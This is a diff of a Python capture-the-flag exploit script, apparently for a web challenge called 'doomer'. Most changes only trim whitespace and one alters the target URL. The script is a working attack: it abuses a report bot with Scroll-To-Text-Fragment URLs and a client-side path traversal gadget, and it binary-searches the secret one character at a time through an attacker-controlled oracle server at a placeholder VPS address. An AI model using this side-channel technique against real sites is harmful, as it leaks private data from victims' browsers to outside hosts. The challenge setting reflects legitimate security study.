@@ -1,11 +1,11 @@
 from urllib.parse import quote
-import httpx 
-import random 
-import string 
-import time 
+import httpx
+import random
+import string
+import time
 
 def generate_random_creds() -> str:
-    username = "".join(random.choices(string.ascii_letters + string.digits, k=8)) 
+    username = "".join(random.choices(string.ascii_letters + string.digits, k=8))
     password = "".join(random.choices(string.ascii_letters + string.digits, k=8))
 
     return username, password
@@ -64,26 +64,26 @@ def STTF_Gadget(client: httpx.Client, username: str, REPORT_SERVER_URL: str, ORA
         L = 0
         R = len(charset) - 1
         found_char = False
-        
+
         while L <= R and not found_char:
             M = (L + R) // 2
-            
+
             test_chars = charset[L:M+1]
-            
+
             fragment_parts = []
             for char in test_chars:
                 # Format: "second-last-char-,last-char,-target-char" to avoid FP
                 fragment_parts.append(f"{current_flag[-2]}-,{current_flag[-1]},-{char}")
-                
+
             sttf_fragment = ":~:text=" + "&text=".join(fragment_parts)
             payload = f"{REPORT_SERVER_URL}/users/@{username}#{sttf_fragment}"
-            
+
             report(client, payload)
             time.sleep(2.5)
-            
+
             print(f"Testing range: {charset[L]} to {charset[M]} (index {L}-{M})")
             if Oracle(client, ORACLE_SERVER_URL):
-                if L == M: 
+                if L == M:
                     found_char = True
                     current_flag += charset[M]
                     print(f"[+] Found character: {charset[M]}")
@@ -91,14 +91,14 @@ def STTF_Gadget(client: httpx.Client, username: str, REPORT_SERVER_URL: str, ORA
                     R = M
             else:
                 L = M + 1
-        
+
         if not found_char:
             print("[*] Finished exfiltrating the flag.")
             print("[+] Flag: " + current_flag)
             break
 
 def exploit():
-    BASE_URL = "http://doomer.quals.scc2025.ctf.rs:1337"
+    BASE_URL = "http://doomer.playground.cyberhero.rs:1337"
     ORACLE_SERVER_URL = "http://<VPS_IP>:9999"
     REPORT_SERVER_URL = "http://web:1337"
 
@@ -116,7 +116,7 @@ def exploit():
     print("[+] Successfully triggered the CSPT Gadget.")
 
     print("[+] Triggering the STTF Gadget...")
-    STTF_Gadget(client, username, REPORT_SERVER_URL, ORACLE_SERVER_URL) 
+    STTF_Gadget(client, username, REPORT_SERVER_URL, ORACLE_SERVER_URL)
 
 if __name__ == "__main__":
     exploit()
